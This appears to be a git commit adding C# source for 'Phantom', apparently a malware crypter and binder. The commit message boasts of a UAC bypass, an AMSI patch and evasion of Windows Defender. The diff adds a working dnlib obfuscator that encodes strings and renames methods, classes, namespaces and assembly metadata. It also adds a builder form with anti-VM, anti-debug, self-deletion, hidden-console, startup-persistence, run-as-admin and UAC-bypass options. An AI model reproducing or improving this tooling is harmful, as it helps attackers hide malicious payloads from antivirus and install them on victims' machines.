2df30505f672d110f65bede1a83e037ee3ba5375
sexyiam <158042876+sexyiam@users.noreply.github.com>
2024-04-25 02:22:10 -0700

    Add files via upload
    Updated UAC Bypass
    Added AMSI Patch via Indirect Syscalls + Obfuscation at build
    WD Bypassed as of 4/25/2024

---
+++ CodeMod/BObf.cs
@@ -0,0 +1,183 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using dnlib.DotNet;
+using dnlib.DotNet.Emit;
+
+namespace Obfuscate
+{
+    internal class Obfuscate
+    {
+        public static string random_string(int length)
+        {
+            string text;
+            do
+            {
+                text = new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
+                                   select s[Obfuscate.random.Next(s.Length)]).ToArray<char>());
+            }
+            while (Obfuscate.names.Contains(text));
+            return text;
+        }
+
+        public static void clean_asm(ModuleDef md)
+        {
+            foreach (TypeDef typeDef in md.GetTypes())
+            {
+                foreach (MethodDef methodDef in typeDef.Methods)
+                {
+                    if (methodDef.HasBody)
+                    {
+                        methodDef.Body.SimplifyBranches();
+                        methodDef.Body.OptimizeBranches();
+                    }
+                }
+            }
+        }
+
+        public static void obfuscate_strings(ModuleDef md)
+        {
+            foreach (TypeDef typeDef in md.GetTypes())
+            {
+                foreach (MethodDef methodDef in typeDef.Methods)
+                {
+                    if (methodDef.HasBody)
+                    {
+                        for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
+                        {
+                            if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
+                            {
+                                string text = methodDef.Body.Instructions[i].Operand.ToString();
+                                string text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
+                                Console.WriteLine(text + " -> " + text2);
+                                methodDef.Body.Instructions[i].OpCode = OpCodes.Nop;
+                                methodDef.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, md.Import(typeof(Encoding).GetMethod("get_UTF8", new Type[0]))));
+                                methodDef.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, text2));
+                                methodDef.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, md.Import(typeof(Convert).GetMethod("FromBase64String", new Type[]
+                                {
+                                    typeof(string)
+                                }))));
+                                methodDef.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, md.Import(typeof(Encoding).GetMethod("GetString", new Type[]
+                                {
+                                    typeof(byte[])
+                                }))));
+                                i += 4;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        public static void obfuscate_methods(ModuleDef md)
+        {
+            foreach (TypeDef typeDef in md.GetTypes())
+            {
+                foreach (MethodDef methodDef in typeDef.Methods)
+                {
+                    if (methodDef.HasBody && !methodDef.IsConstructor && !methodDef.HasOverrides && !methodDef.IsRuntimeSpecialName && !methodDef.DeclaringType.IsForwarder)
+                    {
+                        string text = Obfuscate.random_string(10);
+                        Console.WriteLine(string.Format("{0} -> {1}", methodDef.Name, text));
+                        methodDef.Name = text;
+                    }
+                }
+            }
+        }
+
+        public static void obfuscate_resources(ModuleDef md, string name, string encName)
+        {
+            if (name == "")
+            {
+                return;
+            }
+            foreach (Resource resource in md.Resources)
+            {
+                string text = resource.Name.Replace(name, encName);
+                if (resource.Name != text)
+                {
+                    Console.WriteLine(string.Format("{0} -> {1}", resource.Name, text));
+                }
+                resource.Name = text;
+            }
+        }
+
+        public static void obfuscate_classes(ModuleDef md)
+        {
+            foreach (TypeDef typeDef in md.GetTypes())
+            {
+                string text = Obfuscate.random_string(10);
+                Console.WriteLine(string.Format("{0} -> {1}", typeDef.Name, text));
+                Obfuscate.obfuscate_resources(md, typeDef.Name, text);
+                typeDef.Name = text;
+            }
+        }
+
+        public static void obfuscate_namespace(ModuleDef md)
+        {
+            foreach (TypeDef typeDef in md.GetTypes())
+            {
+                string text = Obfuscate.random_string(10);
+                Console.WriteLine(string.Format("{0} -> {1}", typeDef.Namespace, text));
+                Obfuscate.obfuscate_resources(md, typeDef.Namespace, text);
+                typeDef.Namespace = text;
+            }
+        }
+
+        public static void obfuscate_assembly_info(ModuleDef md)
+        {
+            string text = Obfuscate.random_string(10);
+            Console.WriteLine(string.Format("{0} -> {1}", md.Assembly.Name, text));
+            md.Assembly.Name = text;
+            string[] source = new string[]
+            {
+                "AssemblyDescriptionAttribute",
+                "AssemblyTitleAttribute",
+                "AssemblyProductAttribute",
+                "AssemblyCopyrightAttribute",
+                "AssemblyCompanyAttribute",
+                "AssemblyFileVersionAttribute"
+            };
+            foreach (CustomAttribute customAttribute in md.Assembly.CustomAttributes)
+            {
+                if (source.Any(new Func<string, bool>(customAttribute.AttributeType.Name.Contains)))
+                {
+                    string text2 = Obfuscate.random_string(10);
+                    Console.WriteLine(string.Format("{0} = {1}", customAttribute.AttributeType.Name, text2));
+                    customAttribute.ConstructorArguments[0] = new CAArgument(md.CorLibTypes.String, new UTF8String(text2));
+                }
+            }
+        }
+
+        private static void obfuscate(string inFile, string outFile)
+        {
+            if (inFile == "" || outFile == "")
+            {
+                return;
+            }
+            ModuleDefMD moduleDefMD = ModuleDefMD.Load(inFile);
+            moduleDefMD.Name = Obfuscate.random_string(10);
+            Obfuscate.obfuscate_strings(moduleDefMD);
+            Obfuscate.obfuscate_methods(moduleDefMD);
+            Obfuscate.obfuscate_classes(moduleDefMD);
+            Obfuscate.obfuscate_namespace(moduleDefMD);
+            Obfuscate.obfuscate_assembly_info(moduleDefMD);
+            Obfuscate.clean_asm(moduleDefMD);
+            moduleDefMD.Write(outFile);
+        }
+
+        private static void Main(string inFile = "", string outFile = "")
+        {
+            if (outFile == "")
+            {
+                outFile = inFile + ".Obfuscated";
+            }
+            Obfuscate.obfuscate(inFile, outFile);
+        }
+
+        private static Random random = new Random();
+
+        private static List<string> names = new List<string>();
+    }
+}
---
+++ PhantomMain.Designer.cs
@@ -0,0 +1,336 @@
+﻿namespace Phantom
+{
+    partial class PhantomMain
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PhantomMain));
+            this.buildButton = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.outputPage = new System.Windows.Forms.TabPage();
+            this.listBox2 = new System.Windows.Forms.ListBox();
+            this.binderPage = new System.Windows.Forms.TabPage();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.addFile = new System.Windows.Forms.Button();
+            this.removeFile = new System.Windows.Forms.Button();
+            this.optionsPage = new System.Windows.Forms.TabPage();
+            this.antiVM = new System.Windows.Forms.CheckBox();
+            this.antiDebug = new System.Windows.Forms.CheckBox();
+            this.selfDelete = new System.Windows.Forms.CheckBox();
+            this.hidden = new System.Windows.Forms.CheckBox();
+            this.runas = new System.Windows.Forms.CheckBox();
+            this.startup = new System.Windows.Forms.CheckBox();
+            this.uacBypass = new System.Windows.Forms.CheckBox();
+            this.tabControl1 = new System.Windows.Forms.TabControl();
+            this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
+            this.outputPage.SuspendLayout();
+            this.binderPage.SuspendLayout();
+            this.optionsPage.SuspendLayout();
+            this.tabControl1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // buildButton
+            // 
+            this.buildButton.Location = new System.Drawing.Point(20, 390);
+            this.buildButton.Margin = new System.Windows.Forms.Padding(2);
+            this.buildButton.Name = "buildButton";
+            this.buildButton.Size = new System.Drawing.Size(434, 38);
+            this.buildButton.TabIndex = 7;
+            this.buildButton.Text = "Build";
+            this.buildButton.UseVisualStyleBackColor = true;
+            this.buildButton.Click += new System.EventHandler(this.buildButton_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(17, 70);
+            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(57, 15);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "File path:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(20, 87);
+            this.textBox1.Margin = new System.Windows.Forms.Padding(2);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(434, 20);
+            this.textBox1.TabIndex = 1;
+            // 
+            // outputPage
+            // 
+            this.outputPage.Controls.Add(this.listBox2);
+            this.outputPage.Location = new System.Drawing.Point(4, 22);
+            this.outputPage.Margin = new System.Windows.Forms.Padding(2);
+            this.outputPage.Name = "outputPage";
+            this.outputPage.Padding = new System.Windows.Forms.Padding(2);
+            this.outputPage.Size = new System.Drawing.Size(430, 206);
+            this.outputPage.TabIndex = 3;
+            this.outputPage.Text = "Output";
+            this.outputPage.UseVisualStyleBackColor = true;
+            // 
+            // listBox2
+            // 
+            this.listBox2.FormattingEnabled = true;
+            this.listBox2.Location = new System.Drawing.Point(3, 3);
+            this.listBox2.Margin = new System.Windows.Forms.Padding(2);
+            this.listBox2.Name = "listBox2";
+            this.listBox2.Size = new System.Drawing.Size(426, 186);
+            this.listBox2.TabIndex = 4;
+            // 
+            // binderPage
+            // 
+            this.binderPage.Controls.Add(this.removeFile);
+            this.binderPage.Controls.Add(this.addFile);
+            this.binderPage.Controls.Add(this.listBox1);
+            this.binderPage.Location = new System.Drawing.Point(4, 22);
+            this.binderPage.Margin = new System.Windows.Forms.Padding(2);
+            this.binderPage.Name = "binderPage";
+            this.binderPage.Padding = new System.Windows.Forms.Padding(2);
+            this.binderPage.Size = new System.Drawing.Size(430, 206);
+            this.binderPage.TabIndex = 2;
+            this.binderPage.Text = "Binder";
+            this.binderPage.UseVisualStyleBackColor = true;
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.Location = new System.Drawing.Point(2, 4);
+            this.listBox1.Margin = new System.Windows.Forms.Padding(2);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(426, 160);
+            this.listBox1.TabIndex = 0;
+            // 
+            // addFile
+            // 
+            this.addFile.Location = new System.Drawing.Point(2, 177);
+            this.addFile.Margin = new System.Windows.Forms.Padding(2);
+            this.addFile.Name = "addFile";
+            this.addFile.Size = new System.Drawing.Size(93, 27);
+            this.addFile.TabIndex = 1;
+            this.addFile.Text = "Add file";
+            this.addFile.UseVisualStyleBackColor = true;
+            this.addFile.Click += new System.EventHandler(this.addFile_Click);
+            // 
+            // removeFile
+            // 
+            this.removeFile.Location = new System.Drawing.Point(98, 177);
+            this.removeFile.Margin = new System.Windows.Forms.Padding(2);
+            this.removeFile.Name = "removeFile";
+            this.removeFile.Size = new System.Drawing.Size(93, 27);
+            this.removeFile.TabIndex = 2;
+            this.removeFile.Text = "Remove file";
+            this.removeFile.UseVisualStyleBackColor = true;
+            this.removeFile.Click += new System.EventHandler(this.removeFile_Click);
+            // 
+            // optionsPage
+            // 
+            this.optionsPage.Controls.Add(this.uacBypass);
+            this.optionsPage.Controls.Add(this.startup);
+            this.optionsPage.Controls.Add(this.runas);
+            this.optionsPage.Controls.Add(this.hidden);
+            this.optionsPage.Controls.Add(this.selfDelete);
+            this.optionsPage.Controls.Add(this.antiDebug);
+            this.optionsPage.Controls.Add(this.antiVM);
+            this.optionsPage.Location = new System.Drawing.Point(4, 22);
+            this.optionsPage.Margin = new System.Windows.Forms.Padding(2);
+            this.optionsPage.Name = "optionsPage";
+            this.optionsPage.Padding = new System.Windows.Forms.Padding(2);
+            this.optionsPage.Size = new System.Drawing.Size(430, 206);
+            this.optionsPage.TabIndex = 0;
+            this.optionsPage.Text = "Options";
+            this.optionsPage.UseVisualStyleBackColor = true;
+            // 
+            // antiVM
+            // 
+            this.antiVM.AutoSize = true;
+            this.antiVM.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.antiVM.Location = new System.Drawing.Point(3, 24);
+            this.antiVM.Margin = new System.Windows.Forms.Padding(2);
+            this.antiVM.Name = "antiVM";
+            this.antiVM.Size = new System.Drawing.Size(67, 19);
+            this.antiVM.TabIndex = 10;
+            this.antiVM.Text = "Anti VM";
+            this.antiVM.UseVisualStyleBackColor = true;
+            // 
+            // antiDebug
+            // 
+            this.antiDebug.AutoSize = true;
+            this.antiDebug.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.antiDebug.Location = new System.Drawing.Point(3, 3);
+            this.antiDebug.Margin = new System.Windows.Forms.Padding(2);
+            this.antiDebug.Name = "antiDebug";
+            this.antiDebug.Size = new System.Drawing.Size(86, 19);
+            this.antiDebug.TabIndex = 6;
+            this.antiDebug.Text = "Anti Debug";
+            this.antiDebug.UseVisualStyleBackColor = true;
+            // 
+            // selfDelete
+            // 
+            this.selfDelete.AutoSize = true;
+            this.selfDelete.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.selfDelete.Location = new System.Drawing.Point(3, 45);
+            this.selfDelete.Margin = new System.Windows.Forms.Padding(2);
+            this.selfDelete.Name = "selfDelete";
+            this.selfDelete.Size = new System.Drawing.Size(69, 19);
+            this.selfDelete.TabIndex = 8;
+            this.selfDelete.Text = "Melt file";
+            this.selfDelete.UseVisualStyleBackColor = true;
+            // 
+            // hidden
+            // 
+            this.hidden.AutoSize = true;
+            this.hidden.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.hidden.Location = new System.Drawing.Point(3, 64);
+            this.hidden.Margin = new System.Windows.Forms.Padding(2);
+            this.hidden.Name = "hidden";
+            this.hidden.Size = new System.Drawing.Size(98, 19);
+            this.hidden.TabIndex = 9;
+            this.hidden.Text = "Hide console";
+            this.hidden.UseVisualStyleBackColor = true;
+            // 
+            // runas
+            // 
+            this.runas.AutoSize = true;
+            this.runas.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.runas.Location = new System.Drawing.Point(3, 86);
+            this.runas.Margin = new System.Windows.Forms.Padding(2);
+            this.runas.Name = "runas";
+            this.runas.Size = new System.Drawing.Size(103, 19);
+            this.runas.TabIndex = 11;
+            this.runas.Text = "Run as admin";
+            this.runas.UseVisualStyleBackColor = true;
+            // 
+            // startup
+            // 
+            this.startup.AutoSize = true;
+            this.startup.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.startup.Location = new System.Drawing.Point(3, 105);
+            this.startup.Margin = new System.Windows.Forms.Padding(2);
+            this.startup.Name = "startup";
+            this.startup.Size = new System.Drawing.Size(65, 19);
+            this.startup.TabIndex = 12;
+            this.startup.Text = "Startup";
+            this.startup.UseVisualStyleBackColor = true;
+            this.startup.CheckedChanged += new System.EventHandler(this.startup_CheckedChanged);
+            // 
+            // uacBypass
+            // 
+            this.uacBypass.AutoSize = true;
+            this.uacBypass.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.uacBypass.Location = new System.Drawing.Point(3, 124);
+            this.uacBypass.Margin = new System.Windows.Forms.Padding(2);
+            this.uacBypass.Name = "uacBypass";
+            this.uacBypass.Size = new System.Drawing.Size(92, 19);
+            this.uacBypass.TabIndex = 13;
+            this.uacBypass.Text = "UAC Bypass";
+            this.uacBypass.UseVisualStyleBackColor = true;
+            this.uacBypass.CheckedChanged += new System.EventHandler(this.uacBypass_CheckedChanged);
+            // 
+            // tabControl1
+            // 
+            this.tabControl1.Controls.Add(this.optionsPage);
+            this.tabControl1.Controls.Add(this.binderPage);
+            this.tabControl1.Controls.Add(this.outputPage);
+            this.tabControl1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.tabControl1.Location = new System.Drawing.Point(20, 111);
+            this.tabControl1.Margin = new System.Windows.Forms.Padding(2);
+            this.tabControl1.Name = "tabControl1";
+            this.tabControl1.SelectedIndex = 0;
+            this.tabControl1.Size = new System.Drawing.Size(438, 232);
+            this.tabControl1.TabIndex = 11;
+            // 
+            // guna2Button1
+            // 
+            this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
+            this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
+            this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
+            this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
+            this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9F);
+            this.guna2Button1.ForeColor = System.Drawing.Color.White;
+            this.guna2Button1.Location = new System.Drawing.Point(20, 348);
+            this.guna2Button1.Name = "guna2Button1";
+            this.guna2Button1.Size = new System.Drawing.Size(434, 37);
+            this.guna2Button1.TabIndex = 12;
+            this.guna2Button1.Text = "...";
+            this.guna2Button1.Click += new System.EventHandler(this.openButton_Click);
+            // 
+            // PhantomMain
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
+            this.ClientSize = new System.Drawing.Size(474, 439);
+            this.Controls.Add(this.guna2Button1);
+            this.Controls.Add(this.tabControl1);
+            this.Controls.Add(this.buildButton);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
+            this.MaximizeBox = false;
+            this.Name = "PhantomMain";
+            this.Padding = new System.Windows.Forms.Padding(2, 32, 2, 2);
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Phantom";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.outputPage.ResumeLayout(false);
+            this.binderPage.ResumeLayout(false);
+            this.optionsPage.ResumeLayout(false);
+            this.optionsPage.PerformLayout();
+            this.tabControl1.ResumeLayout(false);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Button buildButton;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TabPage outputPage;
+        private System.Windows.Forms.ListBox listBox2;
+        private System.Windows.Forms.TabPage binderPage;
+        private System.Windows.Forms.Button removeFile;
+        private System.Windows.Forms.Button addFile;
+        private System.Windows.Forms.ListBox listBox1;
+        private System.Windows.Forms.TabPage optionsPage;
+        private System.Windows.Forms.CheckBox uacBypass;
+        private System.Windows.Forms.CheckBox startup;
+        private System.Windows.Forms.CheckBox runas;
+        private System.Windows.Forms.CheckBox hidden;
+        private System.Windows.Forms.CheckBox selfDelete;
+        private System.Windows.Forms.CheckBox antiDebug;
+        private System.Windows.Forms.CheckBox antiVM;
+        private System.Windows.Forms.TabControl tabControl1;
+        private Guna.UI2.WinForms.Guna2Button guna2Button1;
+    }
+}
